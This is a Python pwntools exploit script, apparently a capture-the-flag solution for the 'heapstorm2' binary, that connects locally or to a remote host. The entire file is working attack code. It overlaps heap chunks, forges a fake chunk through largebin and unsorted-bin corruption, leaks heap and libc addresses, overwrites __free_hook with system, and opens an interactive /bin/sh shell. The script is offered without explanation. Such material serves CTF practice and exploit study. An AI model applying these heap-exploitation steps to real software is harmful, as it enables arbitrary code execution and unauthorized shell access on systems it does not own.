#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./heapstorm2"
elf=ELF(pwn_file)
os.environ={"LD_LIBRARY_PATH":"./"}
#libc=ELF("/dbg64/lib/libc.so.6")
libc=ELF("./libc.so.6")
heap_add=0
#stack_add=0
pid=None
r=None

def get_cc():
    global pid
    if len(sys.argv)==1:
        con=process(pwn_file)
        pid=con.pid
    else:
        con=remote("pwn.it",3333)
        pid=0
    return con

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    log.debug("heap add:0x%x"%heap_addr)
    log.debug("libc add:0x%x"%libc.address)
    pause()

while True:
    global r
    r = get_cc()
    def add(size):
        r.sendlineafter("Command: ","1")
        r.sendlineafter("Size: ",str(size))

    def update(idx,cont):
        r.sendlineafter("Command: ","2")
        r.sendlineafter("Index: ",str(idx))
        r.sendlineafter("Size: ",str(len(cont)))
        r.sendafter("Content: ",cont)

    def delete(idx):
        r.sendlineafter("Command: ","3")
        r.sendlineafter("Index: ",str(idx))

    def view(idx):
        r.sendlineafter("Command: ","4")
        r.sendlineafter("Index: ",str(idx))
        r.recvuntil(": ")
        return r.recvline()[:-1]
    add(0x28)# 0
    add(0xf28)# 1
    f={
        0xef0:p64(0xf00)+p64(0x30)
    }
    update(1,fit(f,filler="\x00"))
    add(0x400)# 2
    add(0x20) # 3
    delete(1)
    update(0,"a"*(0x28-0xC))
    add(0x400)# 1
    add(0x400)# 4
    delete(1)
    delete(2)

    add(0xC60)# 1
    f={
        0x818:p64(0x6e1),
        0x828:p64(0x13370800-0x40+3),
        0x838:p64(0x13370800-0x40+3),
    }
    update(1,fit(f,filler="\x00"))
    add(0x400)# 2
    add(0x2b0)# 5
    f={
        0x408:p64(0x6d1),
        0x400+0x6d8:p64(0x21),
        0x400+0x6f8:p64(0x21),
        0x818:p64(0x6e1),
        0x828:p64(0x13370818-0x40),
        0x838:p64(0x13370818-0x40),

    }
    update(1,fit(f,filler="\x00"))
    delete(4) # 4
    add(0x20) # 4


    f={
        0x438:p64(0x6a1),
        0x448:p64(0x133707e0),
    }
    update(1,fit(f,filler="\x00"))
    try:
        add(0x48) # 6
        f={
            0x18:p64(0x524f545350414748),
            0x28:p64(0x13377331),
            0x30:p64(0x133707e0),
        }
        update(6,fit(f,filler="\x00"))
    except Exception as e:
        r.close()
        continue
    data = view(0)
    heap_addr = (u64(data[:8])>>24) + (0x56<<40)- 0x850
    f={
        0x38:p64(0x13377331),
        0x40:p64(heap_addr+0x480)+p64(0x8),
        0x50:p64(0x133707e0)+p64(0x200),
    }
    update(0,fit(f,filler="\x00"))
    libc.address = u64(view(0))- 0x38d008
    debug()
    f={
        0:"/bin/sh",
        0x38:p64(0x13377331),
        0x40:p64(0x133707e0)+p64(0x200),
        0x50:p64(libc.sym["__free_hook"])+p64(0x20),
    }
    update(1,fit(f,filler="\x00"))
    update(1,p64(libc.sym["system"]))
    delete(0)
    r.interactive()
    break














